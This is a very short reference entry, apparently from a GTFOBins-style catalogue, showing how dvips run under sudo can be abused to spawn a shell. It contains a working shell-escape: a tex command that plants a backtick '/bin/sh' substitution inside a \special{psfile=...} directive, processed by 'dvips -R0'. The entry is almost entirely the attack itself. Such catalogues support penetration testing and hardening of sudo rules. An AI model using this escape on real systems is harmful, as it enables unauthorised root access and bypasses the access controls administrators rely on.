dvips
=====

Shell
-----

[Sudo]
    dvips -R0 texput.dvi
    The `texput.dvi` output file produced by `tex` can be created offline and uploaded to the target.

```
tex '\special{psfile="`/bin/sh 1>&0"}\end'
```
